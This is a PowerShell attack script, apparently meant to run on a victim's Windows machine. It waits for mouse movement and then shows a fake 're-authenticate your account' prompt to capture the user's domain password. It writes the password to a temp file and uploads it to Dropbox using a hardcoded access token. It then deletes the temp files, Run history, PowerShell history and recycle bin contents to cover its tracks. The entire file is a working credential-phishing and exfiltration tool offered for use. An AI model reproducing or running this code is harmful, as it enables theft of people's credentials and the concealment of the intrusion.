############################################################################################################################################################                      
#
# _______                       __  __  __                 ______                       __        __ 
#|       \                     |  \|  \|  \               /      \                     |  \      |  \
#| $$$$$$$\  ______  __     __  \$$| $$| $$_______       |  $$$$$$\ __    __   ______   \$$  ____| $$
#| $$  | $$ /      \|  \   /  \|  \| $$ \$/       \      | $$   \$$|  \  |  \ /      \ |  \ /      $$
#| $$  | $$|  $$$$$$\\$$\ /  $$| $$| $$  |  $$$$$$$      | $$      | $$  | $$|  $$$$$$\| $$|  $$$$$$$
#| $$  | $$| $$    $$ \$$\  $$ | $$| $$   \$$    \       | $$   __ | $$  | $$| $$  | $$| $$| $$  | $$
#| $$__/ $$| $$$$$$$$  \$$ $$  | $$| $$   _\$$$$$$\      | $$__/  \| $$__/ $$| $$__/ $$| $$| $$__| $$
#| $$    $$ \$$     \   \$$$   | $$| $$  |       $$       \$$    $$ \$$    $$| $$    $$| $$ \$$    $$
# \$$$$$$$   \$$$$$$$    \$     \$$ \$$   \$$$$$$$         \$$$$$$   \$$$$$$ | $$$$$$$  \$$  \$$$$$$$
#                                                                            | $$                    
#                                                                            | $$                    
#                                                                             \$$                    
#                                                                                           By LulzHades
############################################################################################################################################################

#Version 1.0
#Last updated 24/02/2023

#------------------------------------------------------------------------------------------------------------------------------------

$DropBoxAccessToken = "sl.u.AGK-bs6fpgEo_Zx2PIguWTgJb4gpbBRf0u7WQ-lFz5rZV7Wc79qv19e7l-3DYT7CQ3EILNbyBAGf5hG0PGnCC7hqA6i2_Q4xmIRP0jE31WPzW5vegrj9DmFFzFLugeSwadhwPuBA4b8fY8iRfCf-2_sBh1YZBpyuf-jsIyfrnwjNMzHe9HRukMG3lfjfJ-m5CAsA1lFIitPekAwlj0cnXN43orfG6VH0jwS4jVfwmRfLaJllzXd7pzmKWWVv1zkSkfCy-6r1j41BImEfn9XN_yhPalw-VHISdipFE2FXR5kmQ6PHo6YnvqySirbZ3ma_jYTnafzzc4AyNAFzvch8NEw--Mqghzky5qgbLEN6qdIzs6-9eOQWsZdbeJ4gFJbymWbO2cJJ_p5d_MHTX4slgqLrQ5P49Z3OhmgMtJ6dV2E_t8qdAWHNmLoviQHbHolLwfan-ZVaU-ovFM9so8s_1nhhZKaBdel7qrgm0T-GJxtbPcusLvO1-XsGfccRlyl2pttUFZi3GIg3zDncwQyjrE_Ip2IYUO0Zn1_mYduhzahXxQW2x4tCwR6IjPyNnXeDEEf8krzHxrr2wb9O3FgbUOQVoz9Bg0Z24VAaEjZ6Wwp2yvReLE5KfMjBjdCHkE_6-uNE0eTRvGVTriBvDlUAP9N-WkCj1x_zViig50mAfJC6b6seY5W3I6C5WxHoo6tGCZWHncPpj3ogZ25UCHF6JFxfiS0vTlGTcZ6dA0AnfFcm1KtNSj2z1XrQBMfFDd7airCZGflK_oYY3ZHTNOW2_I5RWabfyW_RBtOCZKjy-ICuUJgn4y9Vu-HOADQbQVwxsf_HfvhnFswMem8Vp_gGOw7mxQ3KsujhMOdeUJyH2jThMZOb_uxr13RtJR0MfsTAma_K7hiMn4LcVkYEQyZ1TpHczby8Xn_yJoGtnfYiJdtIC9YzXxiFA61beZa7Y9R5KOOOuoNzzs6EtHQMekyfr0TV33_luNbVZnuk1dKVGMx4LsP81TX61VXUTlxn0KCfSeb394FQ_G-JOh-0uC82XjxZFSGIHmZF4SORIPB2HgPq4k6G9rrzlm-eu7_PxWYNPs0rZW2VH9PLMa_rRz_m9pTE-4OcuWUOMy_pxPjR-1rXWLPQA6G4TXo1sf0O3VEYa9MfNL-h1PS9pE2D68TiRenAftrTxVxnEk1Z2VnhHXajdGdxaJCi554_dYbcFsiierSROn4FBfdRngIvB7YThcF759FM7gJZGcKi2S4pXTGyxnxM6BCK8BQZrbY39XBiUDYkwyDnTxiS0QFbOsoH3Qm9ef0l79Qjkjb-JTZwoFWhM_hWP0CyxMZV-U4lWlaxAHsAlsF9_zz57NWMCVPXgjRDnXF_xBbgwfn7HJ9_sJfw38OB8hOpsfNyHgGUSyHCYnU81jK0RExEPNAnBKhdLI1pbAG27eDQJfmurXWb3IYIdw"
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to generate the ui.prompt you will use to harvest their credentials #>

function Get-Creds {
do{
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
    #[System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    Get-Creds
}
$creds = $cred.GetNetworkCredential() | fl
return $creds
  # ...

  $done = $true
} until ($done)

}

#----------------------------------------------------------------------------------------------------

<# This is to pause the script until a mouse movement is detected #>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<# This is to call the function to pause the script until a mouse movement is detected then activate the pop-up #>

Pause-Script

Caps-Off

Add-Type -AssemblyName System.Windows.Forms

# [System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please reauthenticate your account")
[System.Windows.Forms.MessageBox]::Show("Please re-authenticate your account!","Account Warning",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to save the gathered credentials to a file in the temp directory #>

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to upload your files to DropBox #>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to clean up behind you and remove any evidence to prove you were in the system #>

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
